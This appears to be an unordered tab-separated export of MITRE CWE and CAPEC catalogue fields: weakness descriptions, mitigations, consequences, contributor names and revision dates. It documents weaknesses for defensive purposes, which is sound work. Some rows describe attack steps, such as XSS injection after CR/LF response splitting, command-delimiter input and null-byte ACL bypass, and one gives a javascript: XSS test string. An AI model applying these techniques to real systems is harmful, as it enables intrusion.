19818	23	Simple Object Access Protocol (SOAP) is used as a communication protocol between a client and server to invoke web services on the server. It is an XML-based protocol, and therefore suffers from many of the same shortcomings as other XML-based protocols. Adviseries can make use these shortcomings to mount an denial of service attack, disclose information and execute arbitrary code. This includes a SOAP parameter tampering attack in which an attacker sends a SOAP message where the field values are other than what the server is likely to expect in order to precipitate non-standard server behavior.
19908	28	CWE Content Team
14606	81	Confidentiality
21830	102	ChildOf
11031	79	Confidentiality
19319	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
16081	39	2008-07-01
7578	54	Low
14755	63	Modify Application Data
25254	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Man-in-the-middle attack tool                                                                     Cost effective for partial coverage:                                                                           Framework-based Fuzzer                            Automated Monitored Execution                            Monitored Virtual Environment - run potentially malicious code in sandbox / wrapper / virtual machine, see if it does anything suspicious
16907	23	The software communicates with a host that provides a certificate, but the software does not properly ensure that the certificate is actually associated with that host.
12357	90	Language-Independent
24316	35	MITRE
11666	23	When an actor claims to have a given identity, the software does not prove or insufficiently proves that the claim is correct.
24728	103	Primary
8515	44	High
14240	91	Architecture and Design
11740	91	Implementation
15296	80	To achieve a denial of service, an attacker can simply overflow a buffer by inserting a long string into an attacker-modifiable injection vector.
24432	26	Implementation
14366	39	2012-05-11
16403	35	MITRE
23515	79	Access Control
10450	62	updated Relationships
20157	62	updated Relationships, Taxonomy_Mappings
15116	39	2008-09-08
14559	91	Implementation
25248	26	Architecture and Design
5598	91	Build and Compilation
8803	39	2012-10-30
17102	35	Cigital
5602	56	ChildOf
14606	63	Read Application Data
12735	70	Crafting Symlinks for Fun and Profit
13801	53	The MITRE Corporation
9904	26	Implementation
24962	59	Updated Description Summary, References
20693	46	For example, in PHP, extraction can be used to provide functionality similar to register_globals, a dangerous functionality that is frequently disabled in production systems. Calling extract() or import_request_variables() without the proper arguments could allow arbitrary global variables to be overwritten, including superglobals.             Similar functionality is possible in other interpreted languages, including custom languages.
24271	28	Eric Dalci
6803	63	Hide Activities
12434	23	The web application improperly neutralizes user-controlled input for executable script disguised with URI encodings.
7829	62	updated Common_Consequences, Observed_Examples, References, Relationships
18306	62	updated Common_Consequences
7249	28	CWE Content Team
20050	39	2010-02-16
7173	81	Other
16468	62	updated Relationships
14471	49	2010
16807	101	CAPEC Content Team
11645	78	High
20826	26	Implementation
19882	78	High
6521	101	CAPEC Content Team
6563	62	updated Potential_Mitigations
8844	56	ChildOf
22802	55	CAPEC Content Team
19808	62	updated Potential_Mitigations, Time_of_Introduction
5936	50	Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.
15304	35	MITRE
7114	48	01
24875	39	2008-11-24
17451	26	Implementation
24158	28	CWE Content Team
8267	62	updated Relationships, Other_Notes, Taxonomy_Mappings
16090	86	http://blogs.msdn.com/michael_howard/archive/2006/05/26/address-space-layout-randomization-in-windows-vista.aspx
5619	39	2011-09-13
13806	35	MITRE
18433	103	Primary
9103	43	Simple
23964	28	CWE Content Team
11130	28	CWE Content Team
14011	27	Binary analysis programs such as 'strings' or 'grep', or hex editors.
12712	62	updated Relationships
15785	26	Implementation
17771	61	Draft
8631	39	2011-06-01
19011	79	Authorization
7174	35	MITRE
22826	35	MITRE
24960	81	Integrity
14073	28	Eric Dalci
6049	73	Inject cross-site scripting payload preceded by response splitting syntax (CR/LF) into user-controllable input identified as vulnerable in the Experiment Phase.
7203	43	Simple
10759	66	Security Development Lifecycle (SDL) Banned Function Calls
18879	21	PLOVER
19384	101	CAPEC Content Team
10579	33	Nuno Ferreira Neves
13288	56	ChildOf
24254	47	Unreliable Execution
21485	28	CWE Content Team
14387	104	787
7766	28	CWE Content Team
12949	35	MITRE
6186	31	1000
18133	96	2009-12-04
24080	39	2014-07-30
11924	35	MITRE
14684	103	Primary
18830	53	The MITRE Corporation
18356	78	High
25358	39	2013-07-17
21567	59	Updated Architectural_Paradigms, Attack_Motivation-Consequences, Attack_Phases, Attack_Prerequisites, Description, Description Summary, Methods_of_Attack, Typical_Likelihood_of_Exploit, Typical_Severity
10034	31	1000
8546	88	Persistent Storable Data Element without Associated Comparison Control Element
21724	62	updated Potential_Mitigations
8346	81	Confidentiality
13720	44	High
16679	76	2018-07-31
16889	39	2014-07-30
9050	39	2012-05-11
19533	21	PLOVER
16600	53	The MITRE Corporation
20059	74	3
11100	62	updated Time_of_Introduction
20701	62	Changed name and description; clarified difference between "access control" and "authorization."
11917	28	CWE Content Team
10964	70	Phishing on Mobile Devices
9928	39	2012-05-11
21244	39	2012-10-30
6534	35	MITRE
19742	44	SOAR Partial
22077	90	Language-Independent
16414	76	2015-11-09
7467	88	Class with Excessively Deep Inheritance
21943	56	CanAlsoBe
10533	21	Anonymous Tool Vendor (under NDA)
22673	81	Other
21382	72	The object could potentially allow the object to be read.
24841	69	Draft
22077	45	Variant
18194	43	Simple
9112	26	Operation
21241	35	MITRE
22294	35	MITRE
12403	50	Prevent unknown code from executing on a system through whitelisting policy.
20381	50	Stay up to date with third party vendor patches
17006	59	Updated Attack_Phases
25293	40	A race condition exists while accessing a resource.
19172	53	The MITRE Corporation
12596	39	2014-02-18
8799	103	Primary
15028	31	1000
23630	97	Group Permission Footprinting
21076	35	MITRE
5983	28	Eric Dalci
20702	35	MITRE
22247	100	The MITRE Corporation
24133	67	Medium
19831	101	CAPEC Content Team
17034	40	This type of an attack requires the adversary to convince the user to load the malicious web page inside the target application. Once loaded, the malicious web page will have the same permissions as the target application and will have access to all registered interfaces. Both the permission and the interface must be in place for the functionality to be exposed.
20260	56	CanPrecede
18502	62	updated Observed_Examples, Relationships
13289	39	2011-06-01
21792	28	CWE Content Team
15647	47	Execute Unauthorized Commands
20752	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                                                                     Cost effective for partial coverage:                                                                           Binary Weakness Analysis - including disassembler + source code weakness analysis
24090	28	CWE Content Team
23154	97	DOM-Based XSS
5949	62	updated Description, Name
17523	39	2008-09-08
21019	61	Draft
22694	21	CWE Content Team
12786	73	Enter command delimiters directly in input fields.
19039	62	updated Relationships
7201	74	2
13159	40	Access to the manufacturer's documentation.
24450	50	Specify expectations for capabilities and dictate which behaviors are acceptable when resource allocation reaches limits.
8310	81	Confidentiality
22107	25	High
22784	28	CWE Content Team
22070	28	CWE Content Team
13718	28	CWE Content Team
23843	28	Eric Dalci
24209	53	The MITRE Corporation
24734	103	Primary
21917	32	Trustwave
17176	61	Draft
23034	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
15194	62	updated Potential_Mitigations
22803	74	5
14838	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Bytecode Weakness Analysis - including disassembler + source code weakness analysis                            Binary Weakness Analysis - including disassembler + source code weakness analysis                            Binary / Bytecode simple extractor – strings, ELF readers, etc.
11664	81	Access Control
7721	62	updated Potential_Mitigations
23913	103	Primary
13324	35	Cigital
18397	97	Object Relational Mapping Injection
18887	45	Variant
10492	51	2014-06-23
22097	39	2008-07-01
21233	91	Implementation
7882	28	CWE Content Team
12980	39	2014-06-23
15956	35	MITRE
11518	39	2010-06-21
5820	23	The application constructs the name of a file or other resource using input from an upstream component, but it does not restrict or incorrectly restricts the resulting name.
10626	62	updated Relationships
18029	39	2008-07-01
9001	100	The MITRE Corporation
16084	39	2008-07-01
22672	62	updated Other_Notes, Relationship_Notes
21494	28	CWE Content Team
16579	73	Test the page using direct load asfunction, getURL,javascript:gotRoot("")///d.jpg
23624	28	CWE Content Team
11861	104	146
7960	62	updated Related_Attack_Patterns
19154	28	CWE Content Team
21341	35	MITRE
12532	45	Base
17710	35	MITRE
11809	63	Modify Files or Directories
12126	103	Primary
25441	101	CAPEC Content Team
23970	104	792
14552	42	Very carefully manage the setting, management, and handling of privileges. Explicitly manage trust zones in the software.
12863	39	2011-09-13
18286	39	2012-05-11
9341	59	Updated References
9733	31	699
15030	35	MITRE
17016	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
8031	81	Access Control
9687	23	The software uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.
18150	74	2
15816	62	updated Time_of_Introduction
20439	62	updated Modes_of_Introduction, Relationships
18730	38	Attempts to download files protected by secrets (usually using encryption) may be a precursor to an offline attack to break the file's encryption and read its contents. This is especially significant if the file itself contains other secret values, such as password files.
24072	73	An attacker makes many anonymous connections and records the session IDs assigned.
21177	62	updated Common_Consequences
13651	35	MITRE
19312	92	Exploit
13290	104	788
11937	76	2019-04-04
19189	39	2014-07-30
6457	23	An adversary uses a combination of techniques to determine the state of the ports on a remote target. Any service or application available for TCP or UDP networking will have a port open for communications over the network. Although common services have assigned port numbers, services and applications can run on arbitrary ports. Additionally, port scanning is complicated by the potential for any machine to have up to 65535 possible UDP or TCP services. The goal of port scanning is often broader than identifying open ports, but also give the adversary information concerning the firewall configuration. Depending upon the method of scanning that is used, the process can be stealthy or more obtrusive, the latter being more easily detectable due to the volume of packets involved, anomalous packet traits, or system logging. Typical port scanning activity involves sending probes to a range of ports and observing the responses. There are four types of port status that this type of attack aims to identify: 1) Open Port: The port is open and a firewall does not block access to the port, 2) Closed Port: The port is closed (i.e. no service resides there) and a firewall does not block access to the port, 3) Filtered Port: A firewall or ACL rule is blocking access to the port in some manner, although the presence of a listening service on the port cannot be verified, and 4) Unfiltered Port: A firewall or ACL rule is not blocking access to the port, although the presence of a listening service on the port cannot be verified. For strategic purposes it is useful for an adversary to distinguish between an open port that is protected by a filter vs. a closed port that is not protected by a filter. Making these fine grained distinctions is impossible with certain scan types. A TCP connect scan, for instance, cannot distinguish a blocked port with an active service from a closed port that is not firewalled. Other scan types can only detect closed ports, while others cannot detect port state at all, only the presence or absence of filters. Collecting this type of information tells the adversary which ports can be attacked directly, which must be attacked with filter evasion techniques like fragmentation, source port scans, and which ports are unprotected (i.e. not firewalled) but aren't hosting a network service. An adversary often combines various techniques in order to gain a more complete picture of the firewall filtering mechanisms in place for a host.
15585	39	2011-06-27
25416	100	The MITRE Corporation
15930	46	Unchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.             Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.
19271	23	The source code uses comment styles or formats that are      inconsistent or do not follow expected standards for the      product.
14488	100	The MITRE Corporation
24598	62	updated Common_Consequences
24601	32	WhiteHat Security
15856	90	Language-Independent
20150	62	updated Potential_Mitigations
22290	35	MITRE
12966	39	2008-09-24
19538	88	Improper Update of Reference Count
19464	78	High
15975	39	2019-01-03
14282	35	MITRE
6227	63	DoS: Resource Consumption (Memory)
5878	39	2019-06-20
23883	35	MITRE
22122	101	CAPEC Content Team
21898	79	Access Control
15085	102	CanFollow
19240	100	The MITRE Corporation
19061	35	MITRE
12833	62	updated Description, Potential_Mitigations
13046	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
21190	39	2017-11-08
13047	28	CWE Content Team
7894	77	Architecture or Design Review
19966	28	CWE Content Team
25328	35	Cigital
23709	35	MITRE
7525	89	Detailed
22798	31	1000
13629	62	updated Relationships, Taxonomy_Mappings
11351	39	2008-10-14
17809	59	Updated Description, Related_Attack_Patterns
5869	35	MITRE
8677	62	updated Relationships
23333	101	CAPEC Content Team
10093	62	updated Likelihood_of_Exploit, Modes_of_Introduction, Relationships
23774	39	2008-09-08
16566	35	MITRE
18254	103	Primary
8963	62	updated Common_Consequences
19219	56	ChildOf
24060	62	updated Common_Consequences
13096	45	Base
17772	39	2014-07-30
7188	35	MITRE
21586	40	The victim must use email or removable media from systems running the IDE (or systems adjacent to the IDE systems).
15691	91	Requirements
7978	69	Draft
12801	91	Implementation
13860	103	Primary
17372	28	CWE Content Team
20226	100	The MITRE Corporation
11604	102	ChildOf
18442	97	Orbital Jamming
13236	35	MITRE
23526	62	updated Demonstrative_Examples, Detection_Factors, Potential_Mitigations, References, Related_Attack_Patterns
8708	63	Read Files or Directories
15196	54	Medium
12532	104	795
12122	59	Updated @Abstraction
19148	91	Testing
6299	42	Use products or modules that conform to FIPS 140-2 [REF-267] to avoid obvious entropy problems. Consult FIPS 140-2 Annex C ("Approved Random Number Generators").
22782	72	Attackers can modify unexpected objects or data that was assumed to be safe from modification.
6170	59	Updated Related_Attack_Patterns
24426	28	CWE Content Team
6524	90	ASP.NET
7305	35	MITRE
10942	62	updated Demonstrative_Examples
21849	62	updated Name, Relationship_Notes
12359	35	MITRE
7472	45	Variant
24114	35	MITRE
18522	85	103
13383	81	Availability
22540	66	Top 25 Series - Rank 7 - Path Traversal
22793	62	updated Relationships, Taxonomy_Mappings
21908	104	574
12181	91	Operation
25297	28	Eric Dalci
23038	35	MITRE
9906	91	Architecture and Design
9744	62	updated Potential_Mitigations
6842	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
22986	62	updated Common_Consequences
14127	33	Michael Gegick
21080	36	https://websec.io/2012/11/26/Core-Concepts-Attack-Patterns.html
11262	79	Confidentiality
17040	91	Requirements
15009	35	MITRE
7763	25	Medium
10526	63	Read Memory
18997	55	CAPEC Content Team
24104	35	MITRE
6541	103	Primary
16507	39	2011-06-01
10771	79	Confidentiality
16626	102	ChildOf
7121	26	Architecture and Design
8686	28	CWE Content Team
19790	51	2014-06-23
8529	57	Indirect
19018	50	Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.
23798	28	Eric Dalci
17706	62	updated Relationships
20189	57	Indirect
8928	85	217
9622	91	Operation
24900	39	2010-09-27
23299	28	CWE Content Team
23966	85	460
18497	39	2017-11-08
24255	28	CWE Content Team
12000	103	Primary
20305	101	CAPEC Content Team
20311	35	MITRE
12662	56	ChildOf
9060	39	2017-11-08
13511	39	2014-07-30
17811	21	PLOVER
7184	62	updated Common_Consequences
20743	28	CWE Content Team
24536	35	MITRE
9574	88	Not Using Password Aging
20487	28	CWE Content Team
16877	91	Testing
21453	56	ChildOf
25020	28	CWE Content Team
17571	103	Primary
21815	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
13713	101	CAPEC Content Team
12520	35	MITRE
16609	39	2017-11-08
8952	92	Explore
14458	39	2014-07-30
10198	73	The attacker loads the predefined or predicted session ID into his browser and browses to protected data or functionality.
5713	91	Architecture and Design
22783	28	CWE Content Team
24098	63	Unexpected State
6211	103	Primary
18233	22	09
17916	56	ChildOf
17282	31	1000
19875	62	updated Applicable_Platforms, Common_Consequences, Description, Relationships, Other_Notes, Taxonomy_Mappings
6457	89	Standard
22311	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize sequences such as ".." that can resolve to a location that is outside of that directory.
6691	104	266
6685	26	Implementation
9571	90	Language-Independent
24883	77	Automated Static Analysis - Binary or Bytecode
11100	39	2008-07-01
19323	103	Primary
15548	62	updated Common_Consequences
8637	88	Incorrect Access of Indexable Resource ('Range Error')
7015	62	updated Common_Consequences, Relationships
9107	52	Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.
24681	39	2011-06-01
20412	50	Implementation: Disable scripting languages such as JavaScript in browser
24564	39	2009-05-27
21143	62	updated Relationships
18900	38	A client can be suspicious if a received link contains preset session identifiers. However, this depends on the client's knowledge of such an issue. Also, fixation through Cross Site Scripting or hidden form fields is usually difficult to detect.
22143	35	MITRE
18796	79	Integrity
23672	28	Sean Eidemiller
14885	35	MITRE
7955	96	2010-08-06
10017	86	http://odetocode.com/blogs/scott/archive/2012/03/11/complete-guide-to-mass-assignment-in-asp-net-mvc.aspx
18043	31	1000
17996	35	Cigital
5857	103	Primary
20294	81	Confidentiality
11152	62	updated Related_Attack_Patterns
9678	89	Detailed
18297	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Solutions_and_Mitigations, Typical_Likelihood_of_Exploit, Typical_Severity
22195	90	C
15750	97	HTTP Response Smuggling
8443	73	Attempt to bypass ACLs on directories by using methods that are known to work against some server types by appending data to the directory request. For instance, appending a Null byte to the end of the request which may cause an ACL to fail and allow access.
14758	63	Unexpected State
19563	51	2014-06-23
13907	22	05
13270	28	CWE Content Team
13416	28	CWE Content Team
11323	39	2014-07-30
21588	31	1000
22154	79	Confidentiality
18257	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Permission Manifest Analysis
7266	69	Incomplete
21828	39	2008-11-24
19443	91	Architecture and Design
23950	73	The attacker models the session ID algorithm enough to produce a compatible session IDs, or just one match.
11488	39	2017-11-08
6937	39	2011-06-27
21716	89	Meta
24362	21	7 Pernicious Kingdoms
14530	62	updated Potential_Mitigations
11653	60	12
22399	62	updated Description
6123	45	Base
12693	55	CAPEC Content Team
25314	63	Reduce Reliability
7514	101	CAPEC Content Team
23569	62	updated Potential_Mitigations, Time_of_Introduction
23346	81	Integrity
7572	66	Cross-site request forgery
14689	28	CWE Content Team
11661	62	updated Time_of_Introduction
21031	24	MITRE
8370	74	1
15196	89	Standard
17761	35	MITRE
20186	21	7 Pernicious Kingdoms
17420	51	2014-06-23
6510	66	EXP00-C. Use parentheses for precedence of operation
24464	31	699
13882	101	CAPEC Content Team
24538	54	Medium
13513	69	Draft
6984	61	Draft
11322	28	CWE Content Team
8874	28	CWE Content Team
20584	62	updated Common_Consequences, Relationship_Notes
12809	62	updated Common_Consequences
14677	90	Language-Independent
12687	28	CWE Content Team
23044	61	Draft
25265	28	CWE Content Team
16403	28	CWE Content Team
6214	31	1000
13194	35	MITRE
17349	35	MITRE
11326	88	Invokable Control Element with Excessive File or Data Access Operations
11321	102	ChildOf
10734	56	ChildOf
19500	28	CWE Content Team
23529	39	2010-09-27
14998	76	2019-04-04
12942	39	2018-03-27
10200	28	CWE Content Team
21939	59	Updated Description Summary, Related_Attack_Patterns, Related_Weaknesses
11118	33	Steve Christey
14554	39	2011-09-13
11916	35	MITRE
22408	63	Other
18274	91	Implementation
10324	35	MITRE
22312	44	Moderate
9099	35	MITRE
6833	66	Algorithmic Complexity Attacks
24038	103	Primary
22259	39	2014-07-30
13107	97	Malicious Logic Insertion into Product Software via Inclusion of 3rd Party Component Dependency
12702	35	MITRE
6108	103	Primary
22374	28	CWE Content Team
15256	101	CAPEC Content Team
21665	31	699
15401	51	2014-06-23
14072	62	updated Potential_Mitigations, Time_of_Introduction
18818	39	2009-01-12
19784	23	An adversary, through a previously installed malicious application, displays an interface that misleads the user and convinces him/her to tap on an attacker desired location on the screen. This is often accomplished by overlaying one screen on top of another while giving the appearance of a single interface. There are two main techniques used to accomplish this. The first is to leverage transparent properties that allow taps on the screen to pass through the visible application to an application running in the background. The second is to strategically place a small object (e.g., a button or text field) on top of the visible screen and make it appear to be a part of the underlying application. In both cases, the user is convinced to tap on the screen but does not realize the application that they are interacting with.
8367	28	CWE Content Team
8392	79	Access Control
21073	28	CWE Content Team
14277	39	2008-07-01
10859	62	updated Potential_Mitigations
12328	88	Exposure of System Data to an Unauthorized Control Sphere
16205	62	updated Applicable_Platforms
12451	80	An attacker needs to know how to interact with various social networking sites (e.g., via available APIs) to request information and how to send the harvested data back to the attacker.
14618	69	Incomplete
6425	35	MITRE
7737	28	CWE Content Team
25145	56	ChildOf
12552	91	Architecture and Design
21213	23	The software performs a key exchange with an actor without verifying the identity of that actor.
25391	31	699
8396	28	CWE Content Team
21844	39	2008-07-01
11304	39	2011-06-01
19013	76	2017-08-04
19746	26	Architecture and Design
8343	62	updated Applicable_Platforms, Common_Consequences, Description, Other_Notes, Potential_Mitigations, References, Relationships, Type
23717	23	An attacker manipulates inputs to the target software which the target software passes to file system calls in the OS. The goal is to gain access to, and perhaps modify, areas of the file system that the target software did not intend to be accessible.
23161	35	MITRE
10876	91	Testing
10181	62	updated Relationships, Taxonomy_Mappings
12906	35	MITRE
9561	74	2
7850	28	CWE Content Team
22101	76	2018-07-31
13207	69	Draft
10641	62	updated Causal_Nature, Relationships, Taxonomy_Mappings
8642	56	ChildOf
13316	28	CWE Content Team
23196	39	2017-05-03
8571	28	CWE Content Team
12984	35	MITRE
24211	35	MITRE
19708	39	2012-05-11
20943	54	Medium
7174	39	2012-05-11
13507	85	384
19748	62	updated Relationships
5867	62	updated Common_Consequences
12398	23	The software does not neutralize or incorrectly neutralizes invalid characters or byte sequences in the middle of tag names, URI schemes, and other identifiers.
24473	62	updated Relationships, Taxonomy_Mappings
15436	56	ChildOf
21863	39	2010-04-05
13402	80	The adversary needs to know how to craft and send protocol commands from the command line or within a tool.
13426	46	Serializable classes are effectively open classes since data cannot be hidden in them. Classes that do not explicitly deny serialization can be serialized by any other class, which can then in turn use the data stored inside it.
8942	78	High
20514	53	The MITRE Corporation
16762	81	Access Control
18020	101	CAPEC Content Team
18993	52	When custom input validation is required, such as when enforcing business rules, manual analysis is necessary to ensure that the validation is properly implemented.
18327	28	CWE Content Team
24673	103	Primary
6027	35	MITRE
7455	69	Draft
6833	33	Wallach
23689	69	Incomplete
23378	48	08
24522	103	Primary
24338	55	CAPEC Content Team
9842	45	Variant
13044	28	CWE Content Team
9593	28	CWE Content Team
24136	35	MITRE
10131	35	MITRE
7792	28	CWE Content Team
13139	39	2018-03-27
16563	95	[Spider] Using a browser or an automated tool, an attacker follows all public links on a web site. He records all the entry points (input) that becomes part of generated HTTP header (not only GET/POST/COOKIE, but also Content-Type, etc.)
12440	63	Reduce Maintainability
22385	76	2015-11-09
9073	62	updated Potential_Mitigations
13313	23	An adversary blocks the delivery of an important system resource causing the system to fail or stop working.
11478	35	MITRE
21598	81	Access Control
18246	63	Bypass Protection Mechanism
12470	55	CAPEC Content Team
7485	81	Other
21321	26	Implementation
21217	74	3
11448	53	The MITRE Corporation
15289	62	updated Relationships, Taxonomy_Mappings
8397	50	Enable AES Kerberos encryption (or another stronger encryption algorithm), rather than RC4, where possible.
11913	92	Exploit
21061	73	Use a spidering tool to follow and record all links. Make special note of any links that include parameters in the URL.
8520	39	2011-03-29
19166	39	2008-09-08
15626	50	Compiler-based canary mechanisms such as StackGuard, ProPolice and the Microsoft Visual Studio /GS flag. Unless this provides automatic bounds checking, it is not a complete solution.
15325	90	Language-Independent
7341	25	High
13063	57	Primary
20817	104	927
20582	62	updated Relationships, Taxonomy_Mappings
17995	100	The MITRE Corporation
23850	42	Use a language or compiler that uses exceptions and requires the catching of those exceptions.
18302	33	David Wagner
13031	35	MITRE
21540	40	An application that leverages a client-side web browser with scripting enabled.
21846	28	Eric Dalci
16973	78	Low
19719	42	Consider a PRNG that re-seeds itself as needed from high quality pseudo-random output sources, such as hardware devices.
10404	62	updated Relationships
6459	39	2009-10-29
22026	28	CWE Content Team
25158	39	2012-05-11
17708	62	updated Relationships
22497	55	CAPEC Content Team
17235	62	added/updated demonstrative examples
11515	39	2018-03-27
22442	62	updated Relationships, Taxonomy_Mappings
17568	77	Automated Static Analysis - Source Code
19473	103	Primary
19535	21	Landwehr
18902	42	Inform the user of why password protections are in place, how they work to protect data integrity, and why it is important to heed their warnings.
17071	21	PLOVER
12925	79	Integrity
14967	103	Primary
17654	28	CWE Content Team
14167	62	updated Related_Attack_Patterns
18489	35	MITRE
16990	42	Directly convert your input type into the expected data type, such as using a conversion function that translates a string into a number. After converting to the expected data type, ensure that the input's values fall within the expected range of allowable values and that multi-field consistencies are maintained.
19238	91	System Configuration
11577	31	1000
12733	69	Incomplete
11643	62	updated Observed_Examples
17914	28	CWE Content Team
22005	35	MITRE
10510	39	2017-11-08
17760	35	MITRE
17960	63	Bypass Protection Mechanism
10810	81	Integrity
17116	35	MITRE
6333	91	Implementation
14706	39	2012-05-11
11380	62	updated Description
10565	25	High
16916	91	Architecture and Design
23154	78	Very High
19108	35	MITRE
17202	62	updated Potential_Mitigations
6737	28	CWE Content Team
8696	62	updated Relationships, Other_Notes, Taxonomy_Mappings, Weakness_Ordinalities
22861	34	COMMISSION: This weakness refers to an incorrect design related to an architectural security tactic.
21982	89	Detailed
15155	104	416
7079	56	ChildOf
11594	40	The decryption routine does not properly authenticate the message / does not verify its integrity prior to performing the decryption operation
14794	78	Medium
21402	62	updated Common_Consequences, Demonstrative_Examples, References, Related_Attack_Patterns, Relationships
16734	62	Suggested OWASP Top Ten mapping
19522	33	Prajakta Jagdale
9275	39	2012-05-11
18692	95	Once an attacker finds a potential weakness, they can craft malicious content to be sent to the system. For instance the attacker may try to submit special characters and observe how the system reacts to an invalid request. The message sent by the attacker may not be XML validated and cause unexpected behavior.
12852	35	MITRE
24366	89	Detailed
17379	56	ChildOf
22144	95	Determine whether the mail server is unpatched and is potentially vulnerable to one of the known MIME conversion buffer overflows (e.g. Sendmail 8.8.3 and 8.8.4).
8978	100	The MITRE Corporation
21472	39	2011-06-01
18446	53	The MITRE Corporation
19480	55	CAPEC Content Team
13762	28	CWE Content Team
15550	28	CWE Content Team
7549	56	ChildOf
12136	39	2017-11-08
25261	28	CWE Content Team
17709	81	Confidentiality
18546	67	High
17683	50	Use static analysis tools to identify log forging vulnerabilities.
15720	31	1000
13026	62	updated Name
21769	39	2019-06-20
15460	85	605
16393	24	MITRE
24049	36	http://en.wikipedia.org/wiki/Proprietary_protocol
8533	95	Scan for user accounts with set SPN values
13185	79	Access Control
21651	28	CWE Content Team
14167	39	2009-03-10
13906	31	699
10059	62	updated Relationships, Taxonomy_Mappings
19887	39	2012-05-11
22700	62	updated Time_of_Introduction
8575	78	Medium
8303	67	Medium
23904	81	Other
16698	88	Wrap-around Error
11759	77	White Box
17160	28	CWE Content Team
13484	104	760
5755	62	updated Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
24186	79	Authorization
15187	47	Other
24449	90	C++
7253	28	CWE Content Team
22301	35	MITRE
14835	44	SOAR Partial
13929	26	Architecture and Design
6419	61	Draft
21507	102	ChildOf
14424	76	2018-07-31
10527	39	2014-07-30
21613	35	MITRE
17903	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
11109	76	2019-09-30
19321	21	CWE Content Team
12655	35	MITRE
23009	28	CWE Content Team
11322	39	2011-06-01
13015	25	High
23990	62	updated Common_Consequences
19922	28	CWE Content Team
14102	81	Integrity
14782	25	Medium
9327	21	CWE Content Team
6947	69	Incomplete
24060	35	MITRE
10622	40	Access to a binary executable.
6876	40	User-controllable input that is not properly validated by the application as part of SQL queries.
13679	50	Application Architects must be careful to design privileged code blocks such that upon return (successful, failed, or unpredicted) that privilege is shed prior to leaving the block/scope.
18876	39	2011-06-01
19176	76	2018-07-31
13143	39	2019-06-20
9942	62	updated Related_Attack_Patterns
11684	72	If malicious data is entered before chunk consolidation can take place, it may be possible to take advantage of a write-what-where primitive to execute arbitrary code.
19125	56	ChildOf
11621	28	CWE Content Team
10733	35	MITRE
19097	28	CWE Content Team
17122	35	MITRE
11615	62	updated Demonstrative_Examples, Related_Attack_Patterns
8773	35	MITRE
13711	91	Architecture and Design
21308	39	2012-10-30
16931	35	MITRE
13059	62	updated Alternate_Terms, Applicable_Platforms, Background_Details, Common_Consequences, Description, Relationships, Other_Notes, References, Taxonomy_Mappings, Weakness_Ordinalities
22623	90	C#
10777	42	Avoid releasing debug binaries into the production environment. Change the debug mode to false when the application is deployed into production.
7913	39	2009-10-29
20946	31	1000
6524	69	Draft
12919	76	2019-04-04
14486	91	Implementation
11646	28	CWE Content Team
11620	91	Documentation
16021	40	An application that fails to adequately sanitize or encode untrusted input.
15236	31	700
14679	79	Integrity
23794	85	448
8905	35	MITRE
21670	35	MITRE
20050	62	updated Detection_Factors, Potential_Mitigations, References, Taxonomy_Mappings
16367	90	Language-Independent
9448	72	If the uninitialized pointer is used in a function call, or points to unexpected data in a write operation, then code execution may be possible.
12944	35	MITRE
16246	54	Low
23985	35	MITRE
10463	78	Low
17004	23	The software creates a communication channel to initiate an outgoing request to an actor, but it does not correctly specify the intended destination for that actor.
24555	21	PLOVER
6749	62	Suggested OWASP Top Ten 2004 mapping
6128	63	Read Application Data
12613	39	2017-11-08
22412	51	2014-06-23
21175	91	Architecture and Design
6856	39	2012-05-11
10013	28	CWE Content Team
14513	97	Privilege Escalation
9243	28	CWE Content Team
19569	63	Reduce Performance
6676	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Manual Source Code Review (not inspections)
23922	28	CWE Content Team
13843	39	2011-09-13
16418	56	ChildOf
15397	35	MITRE
9285	35	MITRE
6576	52	Manual analysis can be useful for finding this weakness, but it might not achieve desired code coverage within limited time constraints. This becomes difficult for weaknesses that must be considered for all inputs, since the attack surface can be too large.
5657	51	2014-06-23
6445	47	Modify Data
19267	62	updated Time_of_Introduction
18466	91	Architecture and Design
6766	62	updated Applicable_Platforms
8407	45	Base
23601	26	Architecture and Design
25044	39	2017-05-03
7014	62	updated Common_Consequences
15557	62	updated References
15029	35	MITRE
9092	28	CWE Content Team
